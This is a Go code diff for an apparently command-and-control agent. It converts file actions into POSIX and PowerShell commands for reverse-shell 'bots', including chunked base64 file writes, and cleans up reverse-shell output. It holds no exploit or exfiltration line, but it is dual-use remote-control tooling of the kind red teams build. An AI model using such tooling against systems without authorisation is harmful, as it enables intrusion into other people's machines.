@@ -6,11 +6,14 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"unicode/utf8"
 
 	"c2agent/internal/command"
 )
 
 func isWindows(osName string) bool { return osName == "Windows" }
+
+func isMac(osName string) bool { return osName == "macOS" }
 
 // posixQuote single-quotes a string for POSIX shells.
 func posixQuote(s string) string {
@@ -28,10 +31,14 @@ func winQuote(s string) (string, error) {
 }
 
 // psQuote quotes a path for a single-quoted PowerShell string (still parsed by
-// cmd first when the host shell is cmd).
+// cmd first when the host shell is cmd). Windows filenames may not contain
+// '"' or '%', so reject them rather than risk breaking the outer quoting.
 func psQuote(s string) (string, error) {
 	if cmdVarRe.MatchString(s) {
 		return "", fmt.Errorf("cmd cannot safely handle '%%' variable patterns in path: %q", s)
+	}
+	if strings.ContainsRune(s, '"') {
+		return "", fmt.Errorf("invalid character in Windows path: %q", s)
 	}
 	return strings.ReplaceAll(s, "'", "''"), nil
 }
@@ -68,7 +75,10 @@ func readFileCmd(osName, path, startLine, endLine string) (string, error) {
 		return "cat " + posixQuote(path), nil
 	}
 	s, err := strconv.Atoi(start)
-	if err != nil || s < 1 {
+	if err != nil {
+		return "", fmt.Errorf("invalid start_line: %s", start)
+	}
+	if s < 1 {
 		s = 1
 	}
 	if strings.TrimSpace(endLine) != "" {
@@ -115,7 +125,17 @@ func renameCmd(osName, path, newName string) (string, error) {
 		}
 		return "powershell -NoProfile -Command \"Rename-Item -LiteralPath '" + p + "' -NewName '" + n + "'\"", nil
 	}
-	return "mv " + posixQuote(path) + " " + posixQuote(newName), nil
+	return "mv " + posixQuote(path) + " " + posixQuote(posixSibling(path, newName)), nil
+}
+
+// posixSibling joins newName onto path's parent directory (both treated as
+// absolute/relative paths, only '/' separator). Mirrors the native agents,
+// which rename in place rather than moving to the current directory.
+func posixSibling(path, newName string) string {
+	if i := strings.LastIndexAny(path, "/"); i >= 0 {
+		return path[:i+1] + newName
+	}
+	return newName
 }
 
 func copyCmd(osName, src, dest string) (string, error) {
@@ -154,14 +174,20 @@ func createFileCmd(osName, path string) (string, error) {
 		if err != nil {
 			return "", err
 		}
-		return "powershell -NoProfile -Command \"New-Item -ItemType File -Force -Path '" + p + "' | Out-Null\"", nil
+		return "powershell -NoProfile -Command \"$d=Split-Path -Parent '" + p +
+			"'; if($d){[IO.Directory]::CreateDirectory($d)|Out-Null}; New-Item -ItemType File -Force -Path '" + p + "' | Out-Null\"", nil
 	}
-	return "touch " + posixQuote(path), nil
+	q := posixQuote(path)
+	return "mkdir -p \"$(dirname " + q + ")\"; touch " + q, nil
 }
 
 const (
 	posixChunk = 100000
 	winChunk   = 8000
+	// Guards against emitting a single shell command that exceeds the host
+	// shell's command-line / input length limits (base64 payload bytes).
+	posixCmdLimit = 900000
+	winCmdLimit   = 7000 // cmd.exe's command line is ~8 KB
 )
 
 func chunks(s string, size int) []string {
@@ -179,6 +205,9 @@ func chunks(s string, size int) []string {
 // writeBase64Cmd builds a single command that base64-decodes b64 into destPath.
 func writeBase64Cmd(osName, destPath, b64 string) (string, error) {
 	if isWindows(osName) {
+		if len(b64) > winCmdLimit {
+			return "", fmt.Errorf("file too large for a shell bot (%d base64 bytes > %d); use a native agent", len(b64), winCmdLimit)
+		}
 		dest, err := psQuote(destPath)
 		if err != nil {
 			return "", err
@@ -190,18 +219,28 @@ func writeBase64Cmd(osName, destPath, b64 string) (string, error) {
 		var stmts []string
 		stmts = append(stmts, "[IO.File]::WriteAllBytes('"+dest+"',[Convert]::FromBase64String('"+cs[0]+"'))")
 		for _, c := range cs[1:] {
-			stmts = append(stmts, "[IO.File]::AppendAllBytes('"+dest+"',[Convert]::FromBase64String('"+c+"'))")
+			// Add-Content -Encoding Byte works on Windows PowerShell 5.1
+			// (unlike [IO.File]::AppendAllBytes, which needs .NET Core 2.0+).
+			stmts = append(stmts, "Add-Content -Path '"+dest+"' -Value ([Convert]::FromBase64String('"+c+"')) -Encoding Byte")
 		}
 		return "powershell -NoProfile -Command \"" + strings.Join(stmts, ";") + "\"", nil
 	}
+	if len(b64) > posixCmdLimit {
+		return "", fmt.Errorf("file too large for a shell bot (%d base64 bytes > %d); use a native agent", len(b64), posixCmdLimit)
+	}
 	dest := posixQuote(destPath)
+	// BSD (macOS) base64 decodes with -D, GNU with -d.
+	b64d := "base64 -d"
+	if isMac(osName) {
+		b64d = "base64 -D"
+	}
 	cs := chunks(b64, posixChunk)
 	if len(cs) == 0 {
 		return "printf '' > " + dest, nil
 	}
-	parts := []string{"printf '%s' '" + cs[0] + "' | base64 -d > " + dest}
+	parts := []string{"printf '%s' '" + cs[0] + "' | " + b64d + " > " + dest}
 	for _, c := range cs[1:] {
-		parts = append(parts, "printf '%s' '"+c+"' | base64 -d >> "+dest)
+		parts = append(parts, "printf '%s' '"+c+"' | "+b64d+" >> "+dest)
 	}
 	return strings.Join(parts, "; "), nil
 }
@@ -355,6 +394,22 @@ func actionToShell(action string, params map[string]any, osName string) (string,
 // delegates to command.String so the control end has a single implementation.
 func paramString(v any) string { return command.String(v) }
 
+// truncateRunes caps s at max runes without splitting a UTF-8 sequence.
+func truncateRunes(s string, max int) string {
+	if len(s) <= max {
+		return s
+	}
+	cut := max
+	for cut > 0 && !utf8.RuneStart(s[cut]) {
+		cut--
+	}
+	return s[:cut]
+}
+
+// oneLine collapses a command to a single line because the marker-based shell
+// protocol frames responses per line; it replaces newlines with spaces, so
+// multi-line constructs (here-docs, multi-line scripts) are NOT supported on
+// shell bots.
 func oneLine(s string) string {
 	s = strings.ReplaceAll(s, "\r\n", " ")
 	s = strings.ReplaceAll(s, "\n", " ")
@@ -363,7 +418,10 @@ func oneLine(s string) string {
 
 func atoiSafe(s string) (int, error) { return strconv.Atoi(strings.TrimSpace(s)) }
 
-var promptRe = regexp.MustCompile(`^\s*(?:\S.*)?[$#>]\s*$`)
+var (
+	promptRe     = regexp.MustCompile(`^\s*(?:\S+\s+)?\S*[$#>]\s*$`)
+	markerLineRe = regexp.MustCompile(`^__C2AGENT_.*__$`)
+)
 
 // stripShellResponse removes the echoed command, the marker-echo line and
 // shell prompts from a raw reverse-shell reply.
@@ -371,9 +429,10 @@ func stripShellResponse(lines []string, marker, lastCommand string) string {
 	markerEcho := "echo " + marker
 	out := make([]string, 0, len(lines))
 	for _, l := range lines {
-		if !strings.Contains(l, markerEcho) {
-			out = append(out, l)
+		if strings.Contains(l, markerEcho) || markerLineRe.MatchString(strings.TrimSpace(l)) {
+			continue
 		}
+		out = append(out, l)
 	}
 	for len(out) > 0 {
 		first := out[0]
